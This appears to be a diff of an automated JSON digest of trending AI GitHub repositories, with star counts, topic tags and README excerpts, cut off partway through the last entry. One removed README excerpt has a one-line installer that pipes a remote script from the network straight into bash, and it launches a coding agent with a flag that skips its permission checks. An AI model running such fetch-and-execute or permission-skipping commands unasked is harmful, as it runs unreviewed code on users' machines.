@@ -1,6 +1,6 @@
 {
   "date": "2026-06-29",
-  "generated_at": "2026-06-29T03:03:34Z",
+  "generated_at": "2026-06-29T03:20:59Z",
   "timezone": "Asia/Shanghai",
   "windows": {
     "rss": "72h",
@@ -16,16 +16,16 @@
       "failed": 4
     },
     "youtube": {
-      "candidates": 35,
+      "candidates": 0,
       "transcript_success": 0,
       "eligible": 0,
-      "failed": 36
+      "failed": 8
     },
     "github": {
-      "candidates": 26,
-      "readme_success": 26,
-      "eligible": 26,
-      "failed": 7
+      "candidates": 24,
+      "readme_success": 24,
+      "eligible": 24,
+      "failed": 9
     },
     "aihot": {
       "api_returned": 50,
@@ -151,161 +151,88 @@
     "youtube": [],
     "github": [
       {
-        "name": "SwarmUI",
-        "full_name": "mcmonkeyprojects/SwarmUI",
-        "url": "https://github.com/mcmonkeyprojects/SwarmUI",
-        "description": "SwarmUI (formerly StableSwarmUI), A Modular Stable Diffusion Web-User-Interface, with an emphasis on making powertools easily accessible, high performance, and extensibility.",
-        "stars": 4271,
-        "pushed_at": "2026-06-29T03:01:35Z",
+        "name": "LightLLM",
+        "full_name": "ModelTC/LightLLM",
+        "url": "https://github.com/ModelTC/LightLLM",
+        "description": "LightLLM is a Python-based LLM (Large Language Model) inference and serving framework, notable for its lightweight design, easy scalability, and high-speed performance.",
+        "stars": 4142,
+        "pushed_at": "2026-06-29T03:15:02Z",
         "topics": [
-          "ai",
-          "comfyui",
-          "csharp",
-          "image-generation",
-          "javascript",
-          "machine-learning",
-          "ml",
-          "python",
-          "stable-diffusion"
-        ],
-        "source": "search",
-        "text_excerpt": "# SwarmUI **SwarmUI v0.9.8 Beta**. *Formerly known as StableSwarmUI.* A Modular AI Image Generation Web-User-Interface, with an emphasis on making powertools easily accessible, high performance, and extensibility. Supports AI image models (*Stable Diffusion, Z-Image, Flux, Qwen Image, etc.*), and AI video models (*Wan, Hunyuan Video, etc.*), with plans to support eg audio and more in the future. ![ui-screenshot](.github/images/swarmui.jpg) - **Discord Community**: Join the [Discord](https://discord.gg/q2y38cqjNw) to discuss the project, get support, see announcements, etc. - **Announcements**: Follow the [Feature Announcements Thread](https://github.com/mcmonkeyprojects/SwarmUI/discussions/1) for updates on new features. - **General documentation**: [/docs folder](https://github.com/mcmonkeyprojects/SwarmUI/blob/master/docs/README.md) - **Website**: [SwarmUI.net](https://swarmui.net/) ---- # Status This project is in **Beta** status. This means for most tasks, Swarm has excellent tooling available to you, but there is much more planned. Swarm is recommended as an ideal UI for most users, beginners and pros alike. There are still some things to be worked out. Beginner users will love Swarm's primary Generate tab interface, making it easy to generate anything with a variety of powerful features. Advanced users may favor the Comfy Workflow tab to get the unrestricted raw graph, but will still have reason to come back to the Generate tab for convenience features (image editor, auto-workflow-generation, etc) and powertools (eg Grid Generator). Those interested in helping push Swarm from Beta to a Full ready-for-anything perfected Release status are welcome to submit PRs (read the [Contributing](/CONTRIBUTING.md) document first), and you can contact us here on GitHub or on [Discord](https://discord.gg/q2y38cqjNw). I highly recommend reaching out to ask about plans for a feature before PRing it. There may already be specific plans or even a work in progress. Key feature targets not yet implemented: - Better mobile browser support - full detail \"Current Model\" display in UI, separate from the model selector (probably as a tab within the batch sidebar?) - LLM-assisted prompting (there's an extension for it, but LLM control should be natively supported) - convenient direct-distribution of Swarm as a program ([Tauri](https://tauri.app/), [Blazor Desktop](https://learn.\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
-        "name": "AI-Infra-Guard",
-        "full_name": "Tencent/AI-Infra-Guard",
-        "url": "https://github.com/Tencent/AI-Infra-Guard",
-        "description": "A full-stack AI Red Teaming platform securing AI ecosystems via OpenClaw Security Scan, Agent Scan, Skills Scan, MCP scan, AI Infra scan and LLM jailbreak evaluation.",
-        "stars": 4003,
-        "pushed_at": "2026-06-29T02:50:10Z",
-        "topics": [
-          "agent",
-          "agent-security",
-          "ai-infra",
-          "ai-red-teaming",
-          "ai-security",
+          "deep-learning",
+          "gpt",
+          "llama",
           "llm",
-          "llm-evaluation",
-          "llm-jailbreak",
-          "llm-security",
-          "mcp-scan",
-          "openclaw-security",
-          "prompt-injection",
-          "prompt-security",
-          "scanner",
-          "security",
-          "security-tools",
-          "skill-scanner",
-          "skills-security",
-          "vulnerability"
-        ],
-        "source": "search",
-        "text_excerpt": "<p align=\"center\"> <h1 align=\"center\"><img vertical-align=\"middle\" width=\"400px\" src=\"img/logo-full-new.png\" alt=\"A.I.G\"/></h1> </p> <p align=\"center\"> <a href=\"https://tencent.github.io/AI-Infra-Guard/\">📖 Documentation</a> | 🌐 <a href=\"./readme/README_ZH.md\">🇨🇳 中文</a> · <a href=\"./readme/README_JA.md\">🇯🇵 日本語</a> · <a href=\"./readme/README_ES.md\">🇪🇸 Español</a> · <a href=\"./readme/README_DE.md\">🇩🇪 Deutsch</a> · <a href=\"./readme/README_FR.md\">🇫🇷 Français</a> · <a href=\"./readme/README_KR.md\">🇰🇷 한국어</a> · <a href=\"./readme/README_PT.md\">🇧🇷 Português</a> · <a href=\"./readme/README_RU.md\">🇷🇺 Русский</a> </p> <p align=\"center\"> <a href=\"https://github.com/tencent/AI-Infra-Guard/stargazers\"> <img src=\"https://img.shields.io/github/stars/tencent/AI-Infra-Guard?style=social\" alt=\"GitHub stars\"> </a> <a href=\"https://github.com/Tencent/AI-Infra-Guard\"> <img alt=\"GitHub downloads\" src=\"https://img.shields.io/github/downloads/Tencent/AI-Infra-Guard/total\"> </a> <a href=\"https://github.com/Tencent/AI-Infra-Guard\"> <img alt=\"docker pulls\" src=\"https://img.shields.io/docker/pulls/zhuquelab/aig-server.svg?color=gold\"> </a> <a href=\"https://github.com/Tencent/AI-Infra-Guard\"> <img alt=\"Release\" src=\"https://img.shields.io/github/v/release/Tencent/AI-Infra-Guard?color=green\"> </a> <a href=\"https://deepwiki.com/Tencent/AI-Infra-Guard\"> <img src=\"https://deepwiki.com/badge.svg\" alt=\"Ask DeepWiki\"> </a> </p> <p align=\"center\"> <a href=\"https://clawhub.ai/aigsec/edgeone-clawscan\" target=\"_blank\"> <img src=\"https://img.shields.io/badge/ClawHub-EdgeOne%20ClawScan-a870dc\" alt=\"EdgeOne ClawScan\"> </a> <a href=\"https://clawhub.ai/aigsec/edgeone-skill-scanner\" target=\"_blank\"> <img src=\"https://img.shields.io/badge/ClawHub-EdgeOne%20Skill%20Scanner-2ea44f\" alt=\"EdgeOne Skill Scanner\"> </a> <a href=\"https://clawhub.ai/aigsec/aig-scanner\" target=\"_blank\"> <img src=\"https://img.shields.io/badge/ClawHub-AIG%20Scanner-e6a817\" alt=\"AIG Scanner\"> </a> </p> <p align=\"center\"> <a href=\"https://trendshift.io/repositories/13637\" target=\"_blank\"><picture><source media=\"(prefers-color-scheme: dark)\" srcset=\"https://trendshift.io/api/badge/repositories/13637\"><source media=\"(prefers-color-scheme: light)\" srcset=\"https://trendshift.io/api/badge/repositories/13637\"><img src=\"https://trendshift.io/api/badge/repositories/13637\" alt=\"Tencent%2FAI-Infra-Guard | Trendshift\" width=\"250\" height=\"55\"/></pic\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
-        "name": "vllm-ascend",
-        "full_name": "vllm-project/vllm-ascend",
-        "url": "https://github.com/vllm-project/vllm-ascend",
-        "description": "Community maintained hardware plugin for vLLM on Ascend",
-        "stars": 2308,
-        "pushed_at": "2026-06-29T02:58:38Z",
-        "topics": [
-          "ascend",
-          "inference",
-          "llm",
-          "llm-serving",
-          "llmops",
-          "mlops",
           "model-serving",
-          "transformer",
-          "vllm"
+          "nlp",
+          "openai-triton"
         ],
         "source": "search",
-        "text_excerpt": "<p align=\"center\"> <picture> <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://raw.githubusercontent.com/vllm-project/vllm-ascend/main/docs/source/logos/vllm-ascend-logo-text-dark.png\"> <img alt=\"vllm-ascend\" src=\"https://raw.githubusercontent.com/vllm-project/vllm-ascend/main/docs/source/logos/vllm-ascend-logo-text-light.png\" width=55%> </picture> </p> <h3 align=\"center\"> vLLM Ascend Plugin </h3> <div align=\"center\"> [![DeepWiki](https://img.shields.io/badge/DeepWiki-Ask_AI-_.svg?style=flat&color=0052D9&labelColor=000000&logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAyCAYAAAAnWDnqAAAAAXNSR0IArs4c6QAAA05JREFUaEPtmUtyEzEQhtWTQyQLHNak2AB7ZnyXZMEjXMGeK/AIi+QuHrMnbChYY7MIh8g01fJoopFb0uhhEqqcbWTp06/uv1saEDv4O3n3dV60RfP947Mm9/SQc0ICFQgzfc4CYZoTPAswgSJCCUJUnAAoRHOAUOcATwbmVLWdGoH//PB8mnKqScAhsD0kYP3j/Yt5LPQe2KvcXmGvRHcDnpxfL2zOYJ1mFwrryWTz0advv1Ut4CJgf5uhDuDj5eUcAUoahrdY/56ebRWeraTjMt/00Sh3UDtjgHtQNHwcRGOC98BJEAEymycmYcWwOprTgcB6VZ5JK5TAJ+fXGLBm3FDAmn6oPPjR4rKCAoJCal2eAiQp2x0vxTPB3ALO2CRkwmDy5WohzBDwSEFKRwPbknEggCPB/imwrycgxX2NzoMCHhPkDwqYMr9tRcP5qNrMZHkVnOjRMWwLCcr8ohBVb1OMjxLwGCvjTikrsBOiA6fNyCrm8V1rP93iVPpwaE+gO0SsWmPiXB+jikdf6SizrT5qKasx5j8ABbHpFTx+vFXp9EnYQmLx02h1QTTrl6eDqxLnGjporxl3NL3agEvXdT0WmEost648sQOYAeJS9Q7bfUVoMGnjo4AZdUMQku50McDcMWcBPvr0SzbTAFDfvJqwLzgxwATnCgnp4wDl6Aa+Ax283gghmj+vj7feE2KBBRMW3FzOpLOADl0Isb5587h/U4gGvkt5v60Z1VLG8BhYjbzRwyQZemwAd6cCR5/XFWLYZRIMpX39AR0tjaGGiGzLVyhse5C9RKC6ai42ppWPKiBagOvaYk8lO7DajerabOZP46Lby5wKjw1HCRx7p9sVMOWGzb/vA1hwiWc6jm3MvQDTogQkiqIhJV0nBQBTU+3okKCFDy9WwferkHjtxib7t3xIUQtHxnIwtx4mpg26/HfwVNVDb4oI9RHmx5WGelRVlrtiw43zboCLaxv46AZeB3IlTkwouebTr1y2NjSpHz68WNFjHvupy3q8TFn3Hos2IAk4Ju5dCo8B3wP7VPr/FGaKiG+T+v+TQqIrOqMTL1VdWV1DdmcbO8KXBz6esmYWYKPwDL5b5FA1a0hwapHiom0r/cKaoqr+27/XcrS5UwSMbQAAAABJRU5ErkJggg==)](https://deepwiki.com/vllm-project/vllm-ascend) </div> <p align=\"center\"> | <a href=\"https://www.hiascend.com/en/\"><b>About Ascend</b></a> | <a href=\"https://docs.vllm.ai/projects/ascend/en/latest/\"><b>Documentation</b></a> | <a href=\"https://slack.vllm.ai\"><b>#SIG-Ascend</b></a> | <a href=\"https://discuss.vllm.ai/c/hardware-support/vllm-ascend-support\"><b>Users Forum</b></a> | <a href=\"https://tinyurl.com/vllm-ascend-meeting\"><b>Weekly Meeting</b></a> | </p> <p align=\"center\"> <a ><b>English</b></a> | <a href=\"README.zh.md\"><b>中文</b></a> </p> --- *Latest News* 🔥 - [2026/05] We released the new offici\n\n[TRUNCATED]",
+        "text_excerpt": "<div align=\"center\"> <picture> <img alt=\"LightLLM\" src=\"assets/logo_new.png\" width=90%> </picture> </div> --- <div align=\"center\"> [![docs](https://img.shields.io/badge/docs-latest-blue)](https://lightllm-en.readthedocs.io/en/latest/) [![Docker](https://github.com/ModelTC/lightllm/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/ModelTC/lightllm/actions/workflows/docker-publish.yml) [![stars](https://img.shields.io/github/stars/ModelTC/lightllm?style=social)](https://github.com/ModelTC/lightllm) ![visitors](https://komarev.com/ghpvc/?username=lightllm&label=visitors) [![Discord Banner](https://img.shields.io/discord/1139835312592392214?logo=discord&logoColor=white)](https://discord.gg/WzzfwVSguU) [![license](https://img.shields.io/github/license/ModelTC/lightllm)](https://github.com/ModelTC/lightllm/blob/main/LICENSE) </div> LightLLM is a Python-based LLM (Large Language Model) inference and serving framework, notable for its lightweight design, easy scalability, and high-speed performance. LightLLM harnesses the strengths of numerous well-regarded open-source implementations, including but not limited to FasterTransformer, TGI, vLLM, and FlashAttention. [English Docs](https://lightllm-en.readthedocs.io/en/latest/) | [中文文档](https://lightllm-cn.readthedocs.io/en/latest/) | [Blogs](https://modeltc.github.io/lightllm-blog/) ## Tech Blogs - [2025/11] 🚀 Prefix KV Cache Transfer between DP rankers is now supported! Check out the technical deep dive in our [blog post](https://light-ai.top/lightllm-blog/2025/11/18/dp_kv_fetch.html). ## News - [2025/09] 🔥 LightLLM [v1.1.0](https://www.light-ai.top/lightllm-blog/2025/09/03/lightllm.html) release! - [2025/08] Pre $^3$ achieves the outstanding paper award of [ACL2025](https://2025.aclweb.org/program/awards/). - [2025/05] LightLLM paper on constrained decoding accepted by [ACL2025](https://arxiv.org/pdf/2506.03887) (Pre $^3$: Enabling Deterministic Pushdown Automata for Faster Structured LLM Generation). For a more accessible overview of the research with key insights and examples, check out our blog post: [LightLLM Blog](https://www.light-ai.top/lightllm-blog/2025/06/15/pre3.html) - [2025/04] LightLLM paper on request scheduler published in [ASPLOS’25](https://dl.acm.org/doi/10.1145/3676641.3716011) (Past-Future Scheduler for LLM Serving under SLA Guarantees) - [2025/02] 🔥 LightLLM v1.0.0 release, ach\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
       {
-        "name": "SnapOtter",
-        "full_name": "snapotter-hq/SnapOtter",
-        "url": "https://github.com/snapotter-hq/SnapOtter",
-        "description": "Self-hosted file toolkit. 200+ tools for Image, Video, Audio, PDF, and Files. AI-powered, open source, fully offline. Your files stay yours.",
-        "stars": 1816,
-        "pushed_at": "2026-06-29T03:01:27Z",
-        "topics": [
-          "ai",
-          "audio-processing",
-          "docker",
-          "file-conversion",
-          "homelab",
-          "image-editor",
-          "image-processing",
-          "media-processing",
-          "open-source",
-          "pdf",
-          "privacy",
-          "self-hosted",
-          "typescript",
-          "video",
-          "video-processing"
-        ],
-        "source": "search",
-        "text_excerpt": "<p align=\"center\"> <img src=\"branding/social-preview.png\" width=\"800\" alt=\"SnapOtter - A Self-Hosted File Manipulation Suite\"> </p> > [!NOTE] > **SnapOtter v2.0.0 is coming soon.** The current Docker image (`latest`) is v1.x and includes image tools only. v2.0 adds 200+ tools across image, video, audio, documents, and files. We're fixing a last-minute issue with local AI installs before publishing the new image. Stay tuned! <p align=\"center\"> <a href=\"https://hub.docker.com/r/snapotter/snapotter\"><img src=\"https://img.shields.io/docker/v/snapotter/snapotter?label=Docker%20Hub&logo=docker\" alt=\"Docker Hub\"></a> <a href=\"https://github.com/orgs/snapotter-hq/packages/container/package/snapotter\"><img src=\"https://img.shields.io/badge/GHCR-ghcr.io%2Fsnapotter--hq%2Fsnapotter-blue?logo=github\" alt=\"GHCR\"></a> <a href=\"https://github.com/snapotter-hq/snapotter/actions\"><img src=\"https://img.shields.io/github/actions/workflow/status/snapotter-hq/snapotter/ci.yml?label=CI\" alt=\"CI\"></a> <a href=\"https://www.bestpractices.dev/projects/12881\"><img src=\"https://www.bestpractices.dev/projects/12881/badge\" alt=\"OpenSSF Best Practices\"></a> <a href=\"https://github.com/snapotter-hq/snapotter/blob/main/LICENSE\"><img src=\"https://img.shields.io/badge/License-AGPLv3-blue\" alt=\"License\"></a> <a href=\"https://github.com/snapotter-hq/snapotter/stargazers\"><img src=\"https://img.shields.io/github/stars/snapotter-hq/snapotter?style=social\" alt=\"Stars\"></a> <a href=\"https://snapotter.com\"><img src=\"https://img.shields.io/badge/Website-snapotter.com-blue?logo=googlechrome&logoColor=white\" alt=\"Website\"></a> <a href=\"https://demo.snapotter.com\"><img src=\"https://img.shields.io/badge/Live%20Demo-Try%20it-blue?logo=googlechrome&logoColor=white\" alt=\"Live Demo\"></a> <a href=\"https://discord.gg/hr3s7HPUsr\"><img src=\"https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&logoColor=white\" alt=\"Discord\"></a> <a href=\"https://github.com/sponsors/snapotter-hq\"><img src=\"https://img.shields.io/badge/Sponsor-pink?logo=githubsponsors&logoColor=white\" alt=\"Sponsor\"></a> </p> <p align=\"center\"> <strong>Self-hosted file toolkit. 200+ tools across image, video, audio, PDF, and files.</strong><br /> The open-source alternative to Smallpdf, iLovePDF, TinyPNG, CloudConvert, and Otter.ai, in one stack you host yourself. </p> ![SnapOtter - Dashboard](branding/dashboard.gif) Stirling-PDF stops at PD\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
-        "name": "Proma",
-        "full_name": "proma-ai/Proma",
-        "url": "https://github.com/proma-ai/Proma",
-        "description": "把最丝滑的通用 Agent 体验带进你的工作流，为 100x 专业用户而生的未来产品，正在实现 proactive Agent 阶段。基于 Claude Agent SDK 的完整开源实践，原生支持飞书群聊调用、灵活接入任意大模型供应商 —— 让顶级 Agent 能力真正跑在你每天用的地方。",
-        "stars": 1414,
-        "pushed_at": "2026-06-29T02:59:27Z",
+        "name": "hope-agent",
+        "full_name": "shiwenwen/hope-agent",
+        "url": "https://github.com/shiwenwen/hope-agent",
+        "description": "🦭跨端交接、越用越懂你的桌面 AI 助手——也能服务化常驻、跑在云上 | Desktop AI that hands off across your devices and gets to know you better — also runs headless on a NAS or in the cloud",
+        "stars": 1089,
+        "pushed_at": "2026-06-29T03:18:09Z",
         "topics": [
           "agent",
-          "agent-sdk",
-          "agents",
+          "ai",
+          "ai-assistant",
+          "anthropic",
           "chatbot",
-          "chatgpt",
           "claude",
+          "claw",
+          "codex",
+          "cross-device",
+          "desktop-app",
           "gemini",
-          "llm"
+          "handoff",
+          "harness",
+          "hermes-agent",
+          "llm",
+          "local-ai",
+          "mcp",
+          "openai",
+          "openclaw",
+          "personal"
         ],
         "source": "search",
-        "text_excerpt": "# Proma Proma 是一个本地优先的 AI 桌面应用，把多模型 Chat、通用 Agent、工作区、Skills、MCP、远程机器人和记忆能力放在同一个开源客户端里。 它不是只面向闲聊的聊天框，而是一个可以长期沉淀个人工作流的 Agent 工作台：简单问题用 Chat，复杂任务交给 Agent，数据和配置尽量留在本地。 ![Proma 海报](https://img.erlich.fun/personal-blog/uPic/pb.png) <video width=\"560\" controls> <source src=\"https://img.erlich.fun/personal-blog/uPic/%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%20Proma.mp4\" type=\"video/mp4\"> </video> [English README](./README.en.md) | [新手教程](./tutorial/tutorial.md) | [下载开源版](https://github.com/ErlichLiu/Proma/releases) | [下载商业版](https://proma.cool/download) > **最新思考 ｜ 2026 Q2–Q3**：[勇敢地解决真实的问题 — Proactive · 个人注意力 · 团队协作](./proma-thinking/proma-2026-q2-q3-thinking.md) ｜ 往期思考：[2026 Q1](./proma-thinking/proma-2026-q1-thinking.md) ## 现在能做什么 - **Chat 模式**：多模型对话、附件解析、图片输入、Markdown / Mermaid / KaTeX / 代码高亮、并排对话、系统提示词、上下文管理。 - **Agent 模式**：基于 `@anthropic-ai/claude-agent-sdk` 的通用 Agent，支持工作区隔离、权限模式、文件操作、长任务流式输出、计划确认和用户追问。 - **SubAgent / Tasks**：复杂任务可以通过 Claude Agent SDK 的 Agent 工具拆分为子 Agent / Task，并在消息流中展示调用过程和结果。 - **Skills & MCP**：每个工作区可以独立配置 Skills、MCP Server 和工作区文件，适合沉淀可复用能力。 - **远程机器人**：支持飞书 / Lark 机器人桥接，并已提供钉钉、微信桥接入口，用手机或群聊触发本机 Agent 工作流。 - **记忆与工具**：Chat 和 Agent 可共享记忆能力，并支持联网搜索、内置 Chat 工具、Agent 推荐等辅助能力。 - **本地优先**：会话、工作区、附件、配置、Skills 等默认存储在 `~/.proma/`，使用 JSON / JSONL 文件组织，不依赖本地数据库。 - **桌面体验**：自动更新、代理设置、文件预览、全局快捷键、快速任务窗口、语音输入、亮色 / 暗色 / 跟随系统主题。 ## 快速开始 ### 下载安装 从 [GitHub Releases](https://github.com/ErlichLiu/Proma/releases) 下载开源版本。当前 release notes 以 `v0.9.12` 为准，提供 macOS Apple Silicon、macOS Intel 和 Windows 安装包。 如果你希望开箱即用、减少 API 配置成本，也可以使用 [Proma 商业版](https://proma.cool/download)。商业版和开源版并行运行，主要区别是商业版提供内置渠道和订阅方案。 ### 首次配置 1. 打开 Proma，先完成环境检查。Agent 模式依赖本机基础环境，尤其是 Git、Node.js / Bun 以及可用的 Shell。 2. 进入 **设置 > 渠道**，添加至少一个 AI 供应商渠道，填写 Base URL、API Key 和模型列表。 3. Chat 模式可以使用 OpenAI、Anthropic、Google 或 OpenAI 兼容协议的渠道。 4. Agent 模式需要 Anthropic 协议或 Anthropic 兼容协议渠道，例如 Anthropic、DeepSeek、Kimi API、Kimi Coding Plan。 5. 进入 **设置 > Agent**，选择默认 Agent 渠道、模型和工作区。 6. 如需记忆、联网搜索、飞书 / 钉钉 / 微信桥接，在设置页对应 Tab 中继续配置。 ## 模式选择 ### Chat 适合 - 日常问答、解释、翻译、润色、轻量代码讨论。 - 读取附件内容后做总结、改写、比较。 - 使用联网搜索或记忆工具增强一次性对话。 - 同时对比多个模型输出，或用不同系统提示词做探索。 ### Agent 适合 - 修改、创建、整理本地文件。 - 调研、编写报告、处理多步骤任务。 - 使用 MCP、Skills、Shell、Git、项目文件等外部上下文。 - 需要权限确认、计划模式、后台任务或远程机器人持续跟进的工作。 简单说：**只需要回答时用 Chat，需要行动和交付结果时用 Agent。** ## 截图 ### Chat 快速分析 用 Chat 处理轻量但真实的分析任务：整理读者关注点、生成对比表，并把首屏文案快速定稿。 ![Proma Chat 快速分析](./docs/assets/screenshots/proma-chat-demo\n\n[TRUNCATED]",
+        "text_excerpt": "<p align=\"center\"> <img src=\"assets/alpha-logo.png\" alt=\"Hope Agent\" width=\"200\"> </p> <h1 align=\"center\">Hope Agent</h1> <p align=\"center\"> <strong>跨端交接、越用越懂你的桌面 AI 助手，也能服务化常驻、跑在云上</strong><br/> 会记忆 · 能成长 · 深度融合 · 在你所有的聊天里随叫随到 </p> <p align=\"center\"> <a href=\"https://github.com/shiwenwen/hope-agent/actions/workflows/rust.yml\"><img src=\"https://img.shields.io/github/actions/workflow/status/shiwenwen/hope-agent/rust.yml?branch=main&style=flat-square&logo=githubactions&logoColor=white&label=CI\" alt=\"CI status\"></a> <a href=\"https://github.com/shiwenwen/hope-agent/releases\"><img src=\"https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white\" alt=\"macOS\"></a> <a href=\"https://github.com/shiwenwen/hope-agent/releases\"><img src=\"https://img.shields.io/badge/Linux-experimental-FFA500?style=flat-square&logo=linux&logoColor=black\" alt=\"Linux (experimental)\"></a> <a href=\"https://github.com/shiwenwen/hope-agent/releases\"><img src=\"https://img.shields.io/badge/Windows-experimental-FFA500?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDMuNDQ5TDkuNzUgMi4xdjkuNDUxSDBtMTAuOTQ5LTkuNjAyTDI0IDB2MTEuNEgxMC45NDlNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlNMTAuOTQ5IDEyLjZIMjRWMjRsLTEyLjktMS44MDEiLz48L3N2Zz4=\" alt=\"Windows (experimental)\"></a> <a href=\"#运行模式\"><img src=\"https://img.shields.io/badge/Web%20GUI-browser-4F46E5?style=flat-square&logo=googlechrome&logoColor=white\" alt=\"Web GUI\"></a> <a href=\"https://www.rust-lang.org/\"><img src=\"https://img.shields.io/badge/Rust-edition%202021-dea584?style=flat-square&logo=rust&logoColor=white\" alt=\"Rust\"></a> <a href=\"https://tauri.app/\"><img src=\"https://img.shields.io/badge/Tauri-2-24C8DB?style=flat-square&logo=tauri&logoColor=white\" alt=\"Tauri\"></a> <a href=\"https://react.dev/\"><img src=\"https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=black\" alt=\"React\"></a> <a href=\"LICENSE\"><img src=\"https://img.shields.io/badge/License-MIT-green?style=flat-square\" alt=\"License: MIT\"></a> </p> <p align=\"center\"> <strong>简体中文</strong> · <a href=\"./README.en.md\">English</a> </p> --- **Hope Agent** 想让 AI 助手真正打开就能用，并且长期稳定地陪你工作：一个原生安装包，内置主流模型 Provider 配置模板；填完 API Key 就能开聊，不必先装运行时、学命令行，也不用维护一堆复杂配置。桌面端是最顺手的入口，我们把 GUI、性能、交互细节和系统深度融合放在最前面；在你授权后，它还能观察并控制本机电脑（暂时仅 macOS）。同时，Hope Agent 也可以\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
       {
-        "name": "clawcodex",
-        "full_name": "agentforce314/clawcodex",
-        "url": "https://github.com/agentforce314/clawcodex",
-        "description": "Token efficient Claude Code full Python rebuild. AI Coding Agent in 230K LoC pure Python. Up to 200X Cost Saving!",
-        "stars": 596,
-        "pushed_at": "2026-06-29T02:54:16Z",
+        "name": "mateclaw",
+        "full_name": "mateaix/mateclaw",
+        "url": "https://github.com/mateaix/mateclaw",
+        "description": "🤖 MateClaw — Your second brain with Multi-Agent Orchestration, MCP Protocol, Skills & Memory, Dream, and Multi-Channel Support. Built on Spring AI Alibaba.",
+        "stars": 667,
+        "pushed_at": "2026-06-29T03:07:40Z",
         "topics": [
           "agent",
-          "ai",
+          "agent-harness",
           "ai-agent",
-          "ai-coding",
-          "claude",
-          "claude-code",
-          "cli",
-          "code",
-          "codex",
-          "coding",
-          "coding-agent",
-          "deepseek",
-          "llm",
-          "python",
-          "token-efficient"
+          "dingtalk-robot",
+          "feishu-bot",
+          "llm-wiki",
+          "loop-engineering",
+          "mcp-protocol",
+          "multi-agent",
+          "multiagent",
+          "openclaw",
+          "plan-and-execute",
+          "skills",
+          "spring-ai",
+          "spring-boot",
+          "telegrambot",
+          "tool-calling"
         ],
         "source": "search",
-        "text_excerpt": "<div align=\"center\"> **English** | [中文](docs/i18n/README_ZH.md) | [Français](docs/i18n/README_FR.md) | [Русский](docs/i18n/README_RU.md) | [हिन्दी](docs/i18n/README_HI.md) | [العربية](docs/i18n/README_AR.md) | [Português](docs/i18n/README_PT.md) # ClawCodex **A production-oriented Python rebuild of Claude Code — real architecture, reliable CLI agent** *Ported from the TypeScript reference implementation and extended with a Python-native runtime* *** [![GitHub stars](https://img.shields.io/github/stars/agentforce314/clawcodex?style=for-the-badge&logo=github&color=yellow)](https://github.com/agentforce314/clawcodex/stargazers) [![GitHub forks](https://img.shields.io/github/forks/agentforce314/clawcodex?style=for-the-badge&logo=github&color=blue)](https://github.com/agentforce314/clawcodex/network/members) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT) [![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/downloads/) **🔥 Active Development • New Features Weekly 🔥** ![ClawCodex Screenshot](assets/clawcodex-screenshot-1.png) </div> *** <div align=\"center\"> # 🐋🔥 DeepSeek Prefix Cache # Run long agentic coding sessions for *pennies* ### Cache-hit input bills at **`~$0.0435` / 1M tokens** — about **230× cheaper** than Claude Fable 5 (`$10` / 1M). ClawCodex keeps your request prefix **byte-stable**, so DeepSeek's prompt cache covers your whole `system + tools + history` span across turns. **The longer you code, the more you save.** </div> *** ## ⚡ Quick Install **One line** — installs `uv`, Python 3.10+, and puts `clawcodex` on your PATH: ```bash curl -fsSL https://clawcodex.app/install.sh | bash ``` Then configure a provider and start coding: ```bash clawcodex login # interactive provider + API key setup → ~/.clawcodex/config.json clawcodex --dangerously-skip-permissions # start the REPL in any project ``` The installer also ships `clawcodex` lifecycle helpers — `doctor` (diagnose your environment), `verify` (health-check the install), `update`, and `uninstall`. It is re-run-safe and works on macOS, Linux, and WSL. To pass flags through the pipe, use `curl -fsSL https://clawcodex.app/install.sh | bash -s -- --dry-run`. <details> <summary><b>Or install manually from source</b></summary> ```bash git clo\n\n[TRUNCATED]",
+        "text_excerpt": "<div align=\"center\"> <p align=\"center\"> <img src=\"mateclaw-ui/public/logo/mateclaw_logo_s.png\" alt=\"MateClaw Logo\" width=\"120\"> </p> # MateClaw <p align=\"center\"><b>Your second brain</b></p> <p align=\"center\"><sub><b>Agent Harness · Spring Boot inside · One JAR to ship</b></sub></p> [![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-black.svg?logo=github)](https://github.com/mateaix/mateclaw) [![Documentation](https://img.shields.io/badge/Docs-Website-green.svg?logo=readthedocs&label=Docs)](https://claw.mate.vip/docs) [![Live Demo](https://img.shields.io/badge/Demo-Online-orange.svg?logo=vercel&label=Demo)](https://claw-demo.mate.vip) [![Website](https://img.shields.io/badge/Website-claw.mate.vip-blue.svg?logo=googlechrome&label=Site)](https://claw.mate.vip) [![Java Version](https://img.shields.io/badge/Java-21+-blue.svg?logo=openjdk&label=Java)](https://adoptium.net/) [![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.5-brightgreen.svg?logo=springboot)](https://spring.io/projects/spring-boot) [![Vue](https://img.shields.io/badge/Vue-3-4FC08D.svg?logo=vuedotjs)](https://vuejs.org/) [![Last Commit](https://img.shields.io/github/last-commit/mateaix/mateclaw)](https://github.com/mateaix/mateclaw) [![License](https://img.shields.io/badge/license-Apache--2.0-red.svg?logo=opensourceinitiative&label=License)](LICENSE) [[Website](https://claw.mate.vip)] [[Live Demo](https://claw-demo.mate.vip)] 